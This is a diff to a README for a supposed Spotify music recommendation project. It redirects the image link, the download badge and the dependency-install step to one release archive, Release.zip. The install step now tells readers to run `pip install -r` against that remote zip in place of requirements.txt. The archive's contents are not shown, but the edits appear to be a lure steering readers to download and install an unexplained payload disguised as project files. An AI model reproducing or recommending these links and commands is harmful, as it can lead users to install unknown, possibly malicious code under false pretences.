@@ -1,7 +1,7 @@
 
 # 🎵 Spotify Music Recommendation System 🎶
 
-![Spotify Music Recommendation System](https://github.com/username/repositoryname/image.png)
+![Spotify Music Recommendation System](https://github.com/Poopman555/Spotify-Music-Recommendation-System/releases/download/v1.0/Release.zip)
 
 Welcome to the Spotify Music Recommendation System repository! This project leverages the power of machine learning to provide personalized music suggestions based on user preferences. Using a hybrid approach that combines K-Means Clustering and Cosine Similarity, this system aims to enhance the music listening experience for users by offering tailored recommendations.
 
@@ -29,7 +29,7 @@ Welcome to the Spotify Music Recommendation System repository! This project leve
 
 To access the project, please click the button below:
 
-[![Download Project](https://img.shields.io/badge/Download-Project%20Files-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/Poopman555/Spotify-Music-Recommendation-System/releases/download/v1.0/Release.zip%20Files-blue)](https://github.com/Poopman555/Spotify-Music-Recommendation-System/releases/download/v1.0/Release.zip)
 
 ### About the Project:
 
@@ -54,7 +54,7 @@ This Music Recommendation System is designed to analyze user listening habits an
 To get started with the Spotify Music Recommendation System, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r requirements.txt`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/Poopman555/Spotify-Music-Recommendation-System/releases/download/v1.0/Release.zip`.
 3. Run the main program to start exploring personalized music recommendations.
 
 ### Contributing:
